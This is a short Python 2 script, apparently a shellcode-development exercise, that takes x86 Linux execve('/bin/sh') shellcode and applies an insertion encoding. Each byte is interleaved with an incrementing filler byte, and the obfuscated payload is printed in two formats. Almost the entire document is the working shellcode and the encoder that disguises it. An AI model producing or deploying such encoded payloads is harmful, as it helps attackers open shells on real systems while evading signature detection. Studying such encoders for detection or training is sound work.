#!/usr/bin/python

# Python Insertion Encoder 
import random

# /bin/sh shellcode
shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Inserting every hex value of the shellcode incremented by 1 value, starting from 0xaa
encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'
val1 = 0xAA
val2 = 0xAA
for x in bytearray(shellcode) :
	
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % val1
	val1 += 1


	# encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
	encoded2 += '%02x,' %x
	encoded2 += '0x%02x,' % val2
	val2 += 1

	# encoded2 += '0x%02x,' % random.randint(1,255)



print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))